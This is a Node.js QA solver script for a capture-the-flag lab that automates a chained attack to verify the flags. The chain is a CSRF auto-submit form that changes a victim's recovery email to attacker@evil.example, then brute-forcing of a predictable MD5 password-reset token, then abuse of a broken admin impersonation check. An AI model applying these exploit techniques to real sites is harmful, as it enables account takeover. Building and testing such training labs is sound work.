#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV CHAIN B (browser-led), full mode (FR-14, arch §5.3).
 *
 *   M2 CSRF (victim bot POST /account/recovery-email — no token, no origin
 *     check) changes the innocent's portal recovery email …… flag ASLV{CSRF-...}
 *   → M5 password reset of the innocent (the portal is the org's recovery
 *     source of truth; the token itself is predictable regardless of where the
 *     mail lands) → takeover as the innocent ………………… flag ASLV{AUTH-...}
 *   → M3 admin document via the MISPLACED check on
 *     /admin/users/impersonate?user_id=admin ……………………… flag ASLV{BAC-...}
 *
 * Solo-play model: the M2 victim bot on the collector vhost is the innocent
 * browser. In full mode the portal account surface lives on aslv.lab.
 *
 * KNOWN COMPOSE GAP (documented in qa/README.md): the full-mode `identity`
 * service is not given PORTAL_INTERNAL_URL, so M5's /forgot cannot consult the
 * portal for the CSRF'd recovery address — the reset mail goes to the
 * innocent's own address instead of the attacker's. The takeover still works
 * through the predictable token (the AUTH win state); the solver checks the
 * mailbox (MailHog) to report where the mail actually landed.
 *
 * Env: FULL_URL (default http://localhost:18024). Exit 0 when CSRF, AUTH and
 * BAC are all captured.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const FULL_URL = process.env.FULL_URL || 'http://localhost:18024';
const BASE = new URL(FULL_URL);
const PORT = Number(BASE.port || 80);
const H = {
  portal: `aslv.lab:${PORT}`,           // M2 account surface in full mode
  neutral: `portal.aslv.lab:${PORT}`,   // reserved subdomain → M3 tenant-neutral pages
  auth: `auth.aslv.lab:${PORT}`,
  collector: `collector.aslv.lab:${PORT}`,
  attacker: `attacker.aslv.lab:${PORT}`,
  mail: `mail.aslv.lab:${PORT}`,
};
const FLAG_RES = {
  CSRF: /ASLV\{CSRF-\d{9,10}\}/,
  AUTH: /ASLV\{AUTH-\d{9,10}\}/,
  BAC: /ASLV\{BAC-\d{9,10}\}/,
};

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const warn = (m) => console.log(`[!] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (host) h.host = host;
    if (payload !== null && !h['content-type']) {
      h['content-type'] = typeof body === 'string'
        ? 'application/x-www-form-urlencoded'
        : 'application/json';
    }
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    if (jar && jar.has('XSRF-TOKEN') && !h['x-xsrf-token']) {
      h['x-xsrf-token'] = decodeURIComponent(jar.get('XSRF-TOKEN'));
    }
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (jar) {
            for (const c of res.headers['set-cookie'] || []) {
              const m = /([^=;]+)=([^;]*)/.exec(c);
              if (m) jar.set(m[1].trim(), m[2]);
            }
          }
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(6000, () => req.destroy(new Error(`request timeout: ${method} ${path} (host ${host || 'default'})`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

function deriveResetToken(username) {
  const day = new Date().toISOString().slice(0, 10).replace(/-/g, '');
  return crypto.createHash('md5').update(`${username}:${day}`).digest('hex').slice(0, 12);
}

async function main() {
  log(`CHAIN B target: ${FULL_URL} (browser-led: M2 → M5 → M3)`);
  const flags = {};

  /* --------------------------------------------------------- M2 → CSRF */
  log('[M2] tester login + exploit page (attacker vhost)');
  const m2jar = new Map();
  const m2login = await request('POST', '/login', {
    host: H.portal, jar: m2jar, headers: { accept: 'application/json' },
    body: { username: '0xnhsec', password: 'vlh-tester-01' },
  });
  if (m2login.status !== 200 || !m2login.json?.ok) die(`[M2] tester login failed: ${m2login.status} ${m2login.text.slice(0, 200)}`);
  ok(`[M2] logged in as ${m2login.json.username}`);
  const page = `<!doctype html><html><body><form action="http://aslv.lab:${PORT}/account/recovery-email" method="POST">
<input name="email" value="attacker@evil.example"><input type="submit"></form>
<script>document.forms[0].submit()</script></body></html>`;
  const put = await request('PUT', '/pages/chain-b-csrf.html', { host: H.attacker, jar: m2jar, body: { body: page } });
  if (put.status !== 200) warn(`[M2] exploit page upload returned ${put.status} (continuing — the bot does not need it)`);

  log('[M2] victim bot: cross-site POST /account/recovery-email (no token, no origin check)');
  const bot = await request('POST', '/victim', {
    host: H.collector,
    body: {
      url: `http://aslv.lab:${PORT}/account/recovery-email`,
      method: 'POST',
      body: { email: 'attacker@evil.example' },
    },
  });
  if (bot.status !== 200) die(`[M2] victim bot failed: ${bot.status} ${bot.text.slice(0, 300)}`);
  const hop = (bot.json?.hops || []).at(-1);
  if (!hop || hop.status !== 200) die(`[M2] victim bot recovery-email POST failed: ${JSON.stringify(bot.json)}`);
  ok('[M2] innocent recovery_email changed by the cross-site POST');

  const v = await request('GET', '/verify?category=CSRF', { host: H.collector });
  flags.CSRF = v.json?.verified && v.json?.flag && FLAG_RES.CSRF.test(v.json.flag) ? v.json.flag : null;
  if (!flags.CSRF) die(`[M2] /verify?category=CSRF did not mint: ${v.status} ${v.text.slice(0, 300)}`);
  ok(`[M2] CSRF flag: ${flags.CSRF}`);

  /* --------------------------------------------------------- M5 → AUTH */
  log('[M5] directory → forgot (mail steering check) → predictable token → reset');
  const dir = await request('GET', '/directory', { host: H.auth });
  const innocent = dir.json?.users?.find((u) => u.role === 'innocent');
  if (!innocent) die(`[M5] no innocent in /directory: ${dir.text.slice(0, 200)}`);
  ok(`[M5] innocent identity: ${innocent.username}`);

  await request('POST', '/forgot', { host: H.auth, body: { username: innocent.username } });
  ok('[M5] /forgot accepted for the innocent (reset link mailed)');

  /* Where did the mail land? MailHog (full mode) exposes /api/v2/messages. */
  let mailedToken = null;
  try {
    const mail = await request('GET', '/api/v2/messages', { host: H.mail });
    if (mail.status === 200 && mail.json?.messages) {
      const TOKEN_MAIL_RE = /token=([0-9a-f]{12}-\d{2})/;
      const reset = [...mail.json.messages].reverse()
        .find((m) => /password reset/i.test(String(m.Content?.Headers?.Subject?.[0] || m.Content?.Headers?.subject?.[0] || ''))
          || /password reset/i.test(String(m.Content?.Body || '')));
      if (reset) {
        const to = String(reset.Content?.Headers?.To?.[0] || reset.Content?.Headers?.to?.[0] || '?');
        /* the body may be raw or base64 — search both plus the whole record */
        const rawBody = String(reset.Content?.Body || '');
        let bodyText = rawBody;
        try { bodyText += `\n${Buffer.from(rawBody, 'base64').toString('utf8')}`; } catch (_) { /* not b64 */ }
        bodyText += `\n${JSON.stringify(reset)}`;
        mailedToken = TOKEN_MAIL_RE.exec(bodyText)?.[1] || null;
        if (/attacker@evil\.example/i.test(to)) {
          ok(`[M5] reset mail steered to the CSRF'd address (${to}) — cross-module hop confirmed`);
        } else {
          warn(`[M5] reset mail went to ${to}, NOT the CSRF'd attacker address — the full-mode identity service lacks PORTAL_INTERNAL_URL (compose gap, see qa/README.md). Token predictability is the working hop.`);
        }
        if (mailedToken) ok(`[M5] reset token recovered from the mail: ${mailedToken}`);
      } else {
        warn('[M5] no reset mail visible in the mailbox yet (mail transport may be async — continuing with the predictable token)');
      }
    } else {
      warn(`[M5] mailbox API unavailable (${mail.status}) — continuing with the predictable token`);
    }
  } catch (e) {
    warn(`[M5] mailbox read failed (${e.message}) — continuing with the predictable token`);
  }

  const prefix = deriveResetToken(innocent.username);
  log(`[M5] deriving predictable tokens ${prefix}-NN (mailed token was ${mailedToken || 'not recovered'})`);
  let reset = null;
  const m5jar = new Map();
  const candidates = [];
  if (mailedToken) candidates.push(mailedToken);
  for (let c = 1; c <= 8; c++) candidates.push(`${prefix}-${String(c).padStart(2, '0')}`);
  for (const token of candidates) {
    if (reset) break;
    const r = await request('POST', '/reset', {
      host: H.auth, jar: m5jar,
      body: { token, new_password: 'chain-b-takeover-1' },
    });
    if (r.status === 200 && r.json?.ok && r.json.auth_method === 'reset') reset = r;
  }
  if (!reset) die('[M5] could not reset the innocent (no valid token from mail or prediction)');
  ok(`[M5] innocent account taken over (session auth_method=reset as ${reset.json.username})`);

  const fa = await request('GET', '/flag/auth', { host: H.auth, jar: m5jar });
  flags.AUTH = fa.json?.flag && FLAG_RES.AUTH.test(fa.json.flag) ? fa.json.flag : null;
  if (!flags.AUTH) die(`[M5] /flag/auth did not mint: ${fa.status} ${fa.text.slice(0, 200)}`);
  ok(`[M5] AUTH flag: ${flags.AUTH}`);

  /* --------------------------------------------------------- M3 → BAC */
  log('[M3] admin document via the misplaced check (impersonate?user_id=admin)');
  /* The org-wide seed does not sync passwords across modules (and the M5 reset
   * only changed M5's row), so a direct innocent login at M3 is not expected —
   * try it, then fall back to the tester. The misplaced check validates the
   * TARGET's role, never the caller's, so any authenticated session works. */
  const m3jar = new Map();
  let loggedInAs = null;
  const lp = await request('GET', '/login', { host: H.neutral, jar: m3jar });
  if (lp.status === 200) {
    const tryLogin = async (username, password) => {
      const form = new URLSearchParams({ username, password }).toString();
      let r = await request('POST', '/login', { host: H.neutral, jar: m3jar, body: form });
      if (r.status === 419) {
        const token = /name="_token"\s+value="([^"]+)"/.exec(lp.text)?.[1];
        if (token) {
          r = await request('POST', '/login', {
            host: H.neutral, jar: m3jar,
            body: new URLSearchParams({ _token: token, username, password }).toString(),
          });
        }
      }
      return r;
    };
    let r = await tryLogin(innocent.username, 'chain-b-takeover-1');
    if (r.status === 302) {
      loggedInAs = innocent.username;
      ok(`[M3] logged in as the innocent (${loggedInAs}) — org-wide seed synced the account`);
    } else {
      warn('[M3] innocent login at M3 not accepted (per-module seeds — documented); falling back to the tester session. The misplaced check does not care about the caller.');
      r = await tryLogin('0xnhsec', 'vlh-tester-01');
      if (r.status === 302) loggedInAs = '0xnhsec';
    }
  }
  if (!loggedInAs) die('[M3] could not establish any authenticated session (as innocent or tester)');

  const imp = await request('GET', '/admin/users/impersonate?user_id=admin', { host: H.neutral, jar: m3jar });
  if (imp.status !== 200 || !imp.json) die(`[M3] /admin/users/impersonate?user_id=admin failed: ${imp.status} ${imp.text.slice(0, 300)}`);
  flags.BAC = FLAG_RES.BAC.exec(JSON.stringify(imp.json))?.[0] || null;
  if (!flags.BAC) die(`[M3] impersonation returned no BAC flag: ${JSON.stringify(imp.json).slice(0, 300)}`);
  ok(`[M3] BAC flag: ${flags.BAC} (caller=${loggedInAs}, target=${imp.json.impersonated})`);

  const missing = Object.keys(FLAG_RES).filter((k) => !flags[k]);
  if (missing.length) die(`chain B incomplete — missing flags: ${missing.join(', ')}`);
  console.log('\n=== CHAIN B (browser-led): ALL THREE FLAGS ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${FULL_URL} (${e.code}) — is the full profile running?  docker compose --profile full up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
